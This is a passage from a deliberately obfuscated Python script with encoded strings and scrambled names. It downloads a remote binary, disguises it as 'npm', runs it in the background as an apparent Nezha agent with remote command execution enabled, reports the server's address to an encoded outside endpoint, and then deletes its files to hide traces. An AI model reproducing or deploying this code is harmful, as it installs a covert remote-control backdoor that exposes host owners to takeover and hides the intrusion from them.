        return (lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 128) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('e8f4f4f0f3baafafe1ede4b6b4aee5efefe3e5aee3efedafe1e7e5eef4')

async def IIIIIIlIlIlIIllIlllIIlI():
    if not NEZHA_SERVER and (not NEZHA_KEY):
        return
    try:
        url = IllllIlIIIIlIIl()
        async with lIIIIIlIlIllIIIIl() as lIIIIlIIlIlIlIllllIIlIlIlII:
            async with lIIIIlIIlIlIlIllllIIlIlIlII.get(url) as IllIIIIIIllllll:
                if IllIIIIIIllllll.status == 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 231) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('de'), 16) * 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 111)) for c in IIIIIIlIIlIlII)))([94, 89]), 16) + 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('32'), 16):
                    lIIlIlllllllIlIlIIIIlI = await IllIIIIIIllllll.read()
                    with IIIIlllIIIllIIIIlIllIlII[(lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 108) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('031c0902')]((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 127 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([18, 15, 17]), (lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 18 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([112, 101])) as llIIIIIIIlIIIIllIlIIIlll:
                        llIIIIIIIlIIIIllIlIIIlll.write(lIIlIlllllllIlIlIIIIlI)
                    lIIlIIIIIllllIIllI((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 177 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([220, 193, 223]), 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 130 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([192]), 16) * 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 36 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([103, 22]), 16) + 0 .__class__((lambda n: int.__xor__(n, 252).to_bytes(1, 'big').decode())(197), 16))
                    IlIllIIIIlIIlIll.info((lambda n: int.__xor__(n, 418459506747399903240064038137137963995206329806920615309130044787581733834).to_bytes(31, 'big').decode())(25249631584107880587205400797747392395005980641592920592350218051832719283))
    except Exception as lIIlllIIIllIIIlllIllIIIl:
        IlIllIIIIlIIlIll.error(f'Download failed: {lIIlllIIIllIIIlllIllIIIl}')

async def llllIIIllIIIllI():
    try:
        lllIlIlIlllIlllII = IIIIlIlIIlllIIlIIlI([(lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('7370'), (lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('787561')], capture_output=True, text=True)
        if (lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 189 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([208, 205, 211, 146, 147]) in lllIlIlIlllIlllII.stdout and (lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 107)) for c in IIIIIIlIIlIlII)))([48, 5, 54, 27, 6]) in lllIlIlIlllIlllII.stdout:
            IlIllIIIIlIIlIll.info((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('2e2e2e70696b73202c676e696e6e75722079646165726c61207369206d706e'))
            return
    except:
        pass
    await IIIIIIlIlIlIIllIlllIIlI()
    lllIIIlllIIlIIIIIllIIIIIll = ''
    lIlIIlIllIlIIIIlIlIll = [(lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('333434'), (lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('33343438'), (lambda n: int.__xor__(n, 2547385793).to_bytes(4, 'big').decode())(2783329527), (lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 129 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([182, 185, 177, 179]), (lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 106 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([89, 82, 90, 88]), (lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 186) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('888a8f89')]
    if NEZHA_SERVER and NEZHA_PORT and NEZHA_KEY:
        IIIIIlIIIllIlIlIIIlIll = (lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 88)) for c in IIIIIIlIIlIlII)))([117, 117, 44, 52, 43]) if NEZHA_PORT in lIlIIlIllIlIIIIlIlIll else ''
        lllIIIlllIIlIIIIIllIIIIIll = f'nohup ./npm -s {NEZHA_SERVER}:{NEZHA_PORT} -p {NEZHA_KEY} {IIIIIlIIIllIlIlIIIlIll} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &'
    elif NEZHA_SERVER and NEZHA_KEY:
        if not NEZHA_PORT:
            port = NEZHA_SERVER.split((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 101)) for c in IIIIIIlIIlIlII)))([95]))[-(0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('3544'), 16) - 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 232 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([220, 172]), 16))] if (lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 41) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('13') in NEZHA_SERVER else ''
            lIlIllIIllIllIlIIIllIII = (lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 165) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('d1d7d0c0') if port in lIlIIlIllIlIIIIlIlIll else (lambda n: int.__xor__(n, 556484609973).to_bytes(5, 'big').decode())(996172182736)
            config = f'client_secret: {NEZHA_KEY}\ndebug: false\ndisable_auto_update: true\ndisable_command_execute: false\ndisable_force_update: true\ndisable_nat: false\ndisable_send_query: false\ngpu: false\ninsecure_tls: true\nip_report_period: 1800\nreport_delay: 4\nserver: {NEZHA_SERVER}\nskip_connection_count: true\nskip_procs_count: true\ntemperature: false\ntls: {lIlIllIIllIllIlIIIllIII}\nuse_gitee_to_upgrade: false\nuse_ipv6_country_code: false\nuuid: {UUID}'
            with IIIIlllIIIllIIIIlIllIlII[(lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 106)) for c in IIIIIIlIIlIlII)))([5, 26, 15, 4])]((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 89) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('3a36373f303e7720383435'), (lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 30) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('69')) as llIIIIIIIlIIIIllIlIIIlll:
                llIIIIIIIlIIIIllIlIIIlll.write(config)
        lllIIIlllIIlIIIIIllIIIIIll = f'nohup ./npm -c config.yaml >/dev/null 2>&1 &'
    else:
        return
    try:
        lIlIlIIIIIll(lllIIIlllIIlIIIIIllIIIIIll, shell=True, executable=(lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 19) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('3c717a7d3c7172607b'))
        IlIllIIIIlIIlIll.info((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 13) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('ef91882d63772d7e796c7f7968692d7e786e6e687e7e6b78616174'))
    except Exception as lIIlllIIIllIIIlllIllIIIl:
        IlIllIIIIlIIlIll.error(f'Error running nz: {lIIlllIIIllIIIlllIllIIIl}')

async def IllllIlIIlIlIlIlII():
    if not AUTO_ACCESS or not DOMAIN:
        return
    llIIIIlllllllIlIIlIlIIlI = f'https://{DOMAIN}/{SUB_PATH}'
    try:
        async with lIIIIIlIlIllIIIIl() as lIIIIlIIlIlIlIllllIIlIlIlII:
            await lIIIIlIIlIlIlIllllIIlIlIlII.post((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 114 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([30, 0, 7, 95, 22, 22, 19, 93, 6, 23, 28, 92, 66, 66, 4, 0, 23, 1, 92, 29, 29, 29, 29, 93, 93, 72, 1, 2, 6, 6, 26]), json={(lambda n: int.__xor__(n, 9864413).to_bytes(3, 'big').decode())(14939825): llIIIIlllllllIlIIlIlIIlI}, headers={(lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 237) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('ae828399888399c0b9949d88'): (lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 223 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([177, 176, 172, 181, 240, 177, 176, 182, 171, 190, 188, 182, 179, 175, 175, 190])})
        IlIllIIIIlIIlIll.info((lambda n: int.__xor__(n, 149275137210070047014710553802429879715617753463093772741389694245858327629646640020522357009078).to_bytes(40, 'big').decode())(672237735525442882646288520422597531499975001695687067378577030733472729832104737933889582450383))
    except:
        pass

def llIlIlIlIIIllllIlllIIlI():
    for IlIlIIIllIIlIlllllIIIllIll in [(lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('6d706e'), (lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('6c6d61792e6769666e6f63')]:
        try:
            if os.path.exists(IlIlIIIllIIlIlllllIIIllIll):
                llIIIllIIIllIIIIIllIll(IlIlIIIllIIlIlllllIIIllIll)
        except:
            pass

async def IIlIIIIlllIlllIIlIlllIII():
    IlllllIIIIlIIlIlllllllI = PORT
    if not lIIIlIIIIIII(IlllllIIIIlIIlIlllllllI):
        IlIllIIIIlIIlIll.warning(f'Port {IlllllIIIIlIIlIlllllllI} is already in use, finding available port...')
        llIIIIIIlllIllIIIlIlllI = IIIIIIIllIIllIIlIIIlll(IlllllIIIIlIIlIlllllllI + (0 .__class__((lambda n: int.__xor__(n, 195).to_bytes(1, 'big').decode())(240), 16) * 0 .__class__((lambda IIIIIIlIIlIlII: b''.__class__([llIIIIIlIllIlllll ^ 235 for llIIIIIlIllIlllll in IIIIIIlIIlIlII[::-1]]).decode())([219]), 16) + 0 .__class__((lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('31'), 16)))
        if llIIIIIIlllIllIIIlIlllI:
            IlllllIIIIlIIlIlllllllI = llIIIIIIlllIllIIIlIlllI
            IlIllIIIIlIIlIll.info(f'Using port {IlllllIIIIlIIlIlllllllI} instead of {PORT}')
        else:
            IlIllIIIIlIIlIll.error((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 85) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('1b3a753423343c393437393075253a27212675333a203b31'))
            llllllIllIlIlIIIIlllI(0 .__class__((lambda n: int.__xor__(n, 1224).to_bytes(2, 'big').decode())(12938), 16) - 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 125)) for c in IIIIIIlIIlIlII)))([75, 28]), 16))
    IllllllIlIIlllI = web.Application()
    IllllllIlIIlllI.router.add_get((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 181) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('9a'), lllIlIIIlllI)
    IllllllIlIIlllI.router.add_get(f'/{SUB_PATH}', lllIlIIIlllI)
    IllllllIlIIlllI.router.add_get(f'/{WSPATH}', IlIIIIIlllIl)
    IlllIIlIIlIIIIIlIl = web.AppRunner(IllllllIlIIlllI)
    await IlllIIlIIlIIIIIlIl.setup()
    IIllIllIllIlllllllIIll = web.TCPSite(IlllIIlIIlIIIIIlIl, (lambda n: int.__xor__(n, 19391429956963988).to_bytes(7, 'big').decode())(32873573122416804), IlllllIIIIlIIlIlllllllI)
    await IIllIllIllIlllllllIIll.start()
    IlIllIIIIlIIlIll.info(f'✅ server is running on port {IlllllIIIIlIIlIlllllllI}')
    IllIIlllllIIllIIIlI(llllIIIllIIIllI())

    async def IIlllIIIlIlIlIlIIIlI():
        await IllIlllllIlIIlIlIlIllIIlII(0 .__class__((lambda n: int.__xor__(n, 8).to_bytes(1, 'big').decode())(58), 16) << 0 .__class__((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 97)) for c in IIIIIIlIIlIlII)))([87]), 16) | 0 .__class__((lambda llIllIllllIllIllIIIlllIIlll: bytes([int.__xor__(int(llIllIllllIllIllIIIlllIIlll[llIIIIIlIllIlllll:llIIIIIlIllIlllll + 2], 16), 253) for llIIIIIlIllIlllll in range(0, len(llIllIllllIllIllIIIlllIIlll), 2)]).decode())('cec9'), 16))
        llIlIlIlIIIllllIlllIIlI()
    IllIIlllllIIllIIIlI(IIlllIIIlIlIlIlIIIlI())
    await IllllIlIIlIlIlIlII()
    try:
        await IIIIIIlIlIlI()
    except KeyboardInterrupt:
        pass
    finally:
        await IlllIIlIIlIIIIIlIl.cleanup()
if __name__ == (lambda n: int.__xor__(n, 17467017849760859277).to_bytes(8, 'big').decode())(12481793788664683474):
    try:
        lIlIIIlllllIIll(IIlIIIIlllIlllIIlIlllIII())
    except KeyboardInterrupt:
        IIIIlllIIIllIIIIlIllIlII[(lambda lllIlIlIIlIIll: b''.fromhex(lllIlIlIIlIIll)[::-1].decode())('746e697270')]((lambda IIIIIIlIIlIlII: ''.join((chr(int.__xor__(c, 113)) for c in IIIIIIlIIlIlII)))([123, 34, 20, 3, 7, 20, 3, 81, 2, 5, 30, 1, 1, 20, 21, 81, 19, 8, 81, 4, 2, 20, 3]))
        llIlIlIlIIIllllIlllIIlI()
